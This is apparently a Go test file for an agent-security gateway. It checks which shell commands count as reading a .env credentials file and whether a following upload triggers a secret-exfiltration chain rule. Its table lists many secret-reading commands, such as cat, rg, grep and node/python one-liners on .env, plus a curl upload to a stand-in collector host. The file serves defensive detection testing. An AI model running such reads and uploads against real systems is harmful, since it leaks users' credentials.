// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
)

// TestCredentialNameInProgramTextIsNoReadOfIt: a credentials-file name that
// a program only prints or writes (python3 -c "print('... .env')", awk
// print > ".env", node -e writeFileSync('.env')), a substitution in grep's
// pattern, and a dotfile a recursive rg or a filtered grep -r does not open
// are no read of that file: the private record stays empty and a later
// unrelated upload is no chain.secret_read_then_egress. Every program,
// substitution and search that does read a credentials file still chains,
// as on rel: a substitution in an input redirect, an rg glob override, the
// last matching grep --include or --exclude (rel-1-0-10:GAP-1047).
func TestCredentialNameInProgramTextIsNoReadOfIt(t *testing.T) {
	dir := t.TempDir()
	for _, f := range []string{".env", "main.go", "input.txt", ".gitignore", "show.py", "src/app.go", "src/.env"} {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, f)), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, f), []byte("x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	type row struct {
		id, command string
		reads       bool
	}
	rows := []row{
		{"Q01", "rg TODO .", false},
		{"Q02", "rg -l TODO . --type go", false},
		{"Q03", "grep -rn TODO . --include=*.go", false},
		{"Q04", "grep -rn --exclude=.env TODO .", false},
		{"Q07", `python3 -c "print('copy .env.example to .env')"`, false},
		{"Q08", `awk '{print > ".env"}' input.txt`, false},
		{"Q09", `grep "$(echo .env)" .gitignore`, false},
		{"Q10", `node -e "require('fs').writeFileSync('.env','A=1')"`, false},
		{"Q10w", `python3 -c "open('.env', 'w').write('A=1')"`, false},
		{"Q11", "rg -n TODO src", false},
		{"Q13", "grep -rn --exclude-dir=src TODO src/..", true},
		{"Q25b", `node -e "console.log(require('fs').readFileSync('.env','utf8'))"`, true},
		{"Q25c", `python3 -c "import os; print(os.popen('cat .env').read())"`, true},
		{"Q25d", `awk '{ while ((getline line < ".env") > 0) print line }' input.txt`, true},
		{"Q26", "rg --hidden KEY .", true},
		{"Q26b", "rg -. KEY .", true},
		{"Q28", "sed -n p .env", true},
		{"Q29", "grep -r KEY .", true},
		{"Q29b", "grep -rn KEY . --include=.env", true},
		{"Q29c", "grep -rn KEY src --exclude-dir=node_modules", true},
		// The shell glob *.env does not match the dotfile src/.env.
		{"Q30", "cat src/*.env", false},
		{"Q30b", `cat "$(echo .env)"`, true},
		{"Q31", "rg -uu KEY .", true},
		// A substitution in an input redirect is read (cat has no operand).
		{"Q32", `cat < "$(echo .env)"`, true},
		{"Q32b", `cat <"$(printf %s .env)"`, true},
		// A glob override can whitelist a dotfile: rg opens it.
		{"Q33", "rg -g .env KEY .", true},
		{"Q33b", "rg -g '*' KEY .", true},
		{"Q33c", "rg '--glob=*.env' KEY .", true},
		{"Q33d", "rg --iglob .ENV KEY .", true},
		{"Q33e", "rg --glob=*.env KEY .", true},
		{"Q33f", "rg -ig .env KEY .", true},
		// GNU grep: the last matching --include or --exclude wins, and a
		// name none matches is read unless the first one is --include.
		{"Q34", "grep -r --exclude='*.env' --include='.env' KEY .", true},
		{"Q34b", "grep -r --exclude='*.txt' --include='*.go' KEY .", true},
		{"Q34c", "grep -r --include='.env' --exclude='*.env' KEY .", false},
		// An --exclude the filter cannot read (an expansion, an
		// --exclude-from file) or an abbreviated option (--incl) keeps
		// every name grep may read, as on rel.
		{"Q35", `grep -r --exclude="$X" --include='*.go' KEY .`, true},
		{"Q35b", "grep -r --exclude-from=ignore.lst --include='*.go' KEY .", true},
		{"Q35c", "grep -r --exclude='*.env' --incl='.env' KEY .", true},
		// An abbreviated --include whose value expands, or a word that may
		// expand to an --include, reads every name from there on, as on rel
		// (rel-1-0-10:GAP-1666).
		{"Q36", `grep -r --exclude='*.env' --incl="$X" KEY .`, true},
		{"Q36b", "grep -r --exclude='*.env' --inc=$X KEY .", true},
		{"Q36c", `grep -r --exclude='*.env' "$X" KEY .`, true},
	}
	installCorrelationHMACForTest(t)
	for _, r := range rows {
		t.Run("facts/"+r.id, func(t *testing.T) {
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: r.command, CWD: dir, ActiveHome: t.TempDir()})
			if got := credentialFileContentRead(facts); got != r.reads {
				t.Errorf("%s: credentials-file read %v, want %v (private %v)", r.command, got, r.reads, facts.CredentialPathReads())
			}
		})
	}
	// A stdin upload names no file, so every credentials-file read before
	// it chains (an upload of one exact other file would not).
	if err := SetSubstrateChainEgressAction(""); err != nil {
		t.Fatal(err)
	}
	const upload = "curl --data-binary @- https://collector.invalid/upload"
	for _, pack := range []string{"default", "strict"} {
		handler := hostClaudeHookHandlerForTest(t, pack)
		for _, r := range rows {
			t.Run(fmt.Sprintf("chain/%s/%s", pack, r.id), func(t *testing.T) {
				got := runHostSecretReadFlowForTest(t, handler, fmt.Sprintf("gap1047-%s-%s", pack, r.id), dir, r.command, upload)
				chain := false
				for _, id := range got.RuleIDs {
					chain = chain || id == "chain.secret_read_then_egress"
				}
				if chain != r.reads {
					t.Errorf("%s then upload: chain %v, want %v (send %s/%s)", r.command, chain, r.reads, got.Action, got.Severity)
				}
			})
		}
	}
}
